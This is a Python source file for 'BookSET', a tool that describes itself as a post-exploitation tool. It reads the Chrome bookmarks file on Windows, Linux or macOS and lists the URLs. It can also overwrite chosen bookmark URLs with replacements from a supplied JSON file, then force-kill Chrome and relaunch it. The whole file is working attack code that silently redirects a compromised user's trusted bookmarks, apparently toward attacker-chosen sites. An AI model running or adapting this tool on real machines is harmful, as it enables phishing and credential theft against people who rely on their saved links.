import argparse
import os
import json
import pyfiglet
import platform
import subprocess
import psutil
import time


def detect_os():
    os_name = platform.system()
    if os_name == "Windows":
        return "win"
    elif os_name == "Linux":
        return "linux"
    elif os_name == "Darwin":
        return "mac"
    else:
        return "unknown"
    
    
def get_bookmarks_path():
    
    os_name = detect_os()
    home_dir = os.path.expanduser("~")
    if os_name == "win":
        # bookmarks_path = os.path.join(home_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Bookmarks")
        # bookmarks_path = os.path.join(home_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Bookmarks")
        bookmarks_path = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Bookmarks")
    elif os_name == "linux":
        bookmarks_path = os.path.join(home_dir, ".config", "google-chrome", "Default", "Bookmarks")
    elif os_name == "mac":
        bookmarks_path = os.path.join(home_dir, "Library", "Application Support", "Google", "Chrome", "Default", "Bookmarks")
    else:
        raise OSError("something its wrong :( \n\r")

    return bookmarks_path


def read_bookmarks():
    bookmarks_path = get_bookmarks_path()
    with open(bookmarks_path, "r", encoding="utf-8") as f:
        bookmarks = json.load(f)
    return bookmarks

def replace_bookmark_urls():
    bookmarks = read_bookmarks()
    with open("bookmarks.json", "r", encoding="utf-8") as f:
        urls_to_replace = json.load(f)
    
    modified_urls = []
    num_urls_mod = 0
    
    for url in urls_to_replace["bookmark_bar"]:
        for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
            if "url" in bookmark and bookmark["url"] == url["current_url"]:
                bookmark["url"] = url["new_url"]
                modified_urls.append(url["current_url"])
                num_urls_mod += 1
                
    with open(get_bookmarks_path(), "w", encoding="utf-8") as f:
        json.dump(bookmarks, f, ensure_ascii=False, indent=2)

    if len(modified_urls) <= 0 :
        print("[+] There's nothing to Modify :( \n\r")
        
    else:    
        print("[+] URLs modified: \n\r")
        print()
        for url in modified_urls:
            print("     [-]",url)
        
        print()    
        print("[+] Total of BookMarks replaced : [{0}]".format(num_urls_mod))
        
        close_chrome()
    

        
def recon_bookmarks():
    bookmarks = read_bookmarks()
    urls = []
    for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
        if "url" in bookmark:
            urls.append(bookmark["url"])
    print("[+] Getting Urls from BookMarks: \n\r")

    for url in urls:
        print("     [-] ",url," \n\r")
      
    print("[+] Total of BookMarks identified: [{0}] \n\r".format(len(urls)))
    
    
def close_chrome():

    #chrome_path = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe" - Edge Browser
    #chrome_path = "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe" - Brave Browser
    running = 0
    url = "https://www.google.com"
    
    for proc in psutil.process_iter(['pid', 'name']):
        if 'chrome' in proc.info['name'].lower():

            running = 1
            break
    
    if running == 1 :
        print("Chrome it's running !! \n\r")
        os_name = detect_os()
        if platform.system() == "Windows":
            subprocess.Popen("taskkill /f /im chrome.exe")

            print("[+] Chrome was Closed ! \n\r")
            time.sleep(4)
            
            chrome_path = "C:/Program Files/Google/Chrome/Application/chrome.exe"
            print("\n\r[+] Opening Chrome ! \n\r")
            time.sleep(0.80)
            print("[+] Done !! \n\r")

            subprocess.Popen([chrome_path, url])

        elif platform.system() == "Linux":
            subprocess.Popen(["pkill", "chrome"])

            print("Chrome was Closed ! \n\r")
            time.sleep(4)
            
            chrome_path = "/usr/bin/google-chrome"
            print("\n\r[+] Opening Chrome ! \n\r")
            time.sleep(0.80)
            print("[+] Done !! \n\r")
            subprocess.Popen([chrome_path, url])
    
        elif platform.system() == "Darwin":
            subprocess.Popen(["killall", "Google Chrome"])

            print("Chrome was Closed ! \n\r")
            time.sleep(4)
            
            chrome_path = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
            print("\n\r[+] Opening Chrome ! \n\r")
            time.sleep(0.80)
            print("[+] Done !! \n\r")
            subprocess.Popen([chrome_path, url])   
        
    else:
        print("[+] Chrome isn't running ! \n\r")
         
    
if __name__ == "__main__":
    
    banner = "BookSET"
    ASCII_art_1 = pyfiglet.figlet_format(banner)

 
    print(ASCII_art_1)
    print("[ just a simple post-exploitation tool :) by @_mrpack ] \n\r")
 
    parser = argparse.ArgumentParser(description="Get and Replace all Urls from Google Chrome BookMarks")
    parser.add_argument("-recon", action="store_true", help="Get all URLs Bookmarks")
    parser.add_argument("-replace", action="store_true", help="Replace URLs Bookmarks")
    args = parser.parse_args()

    if args.recon:
        recon_bookmarks()
    elif args.replace:
        replace_bookmark_urls()
    else:
        parser.print_help()

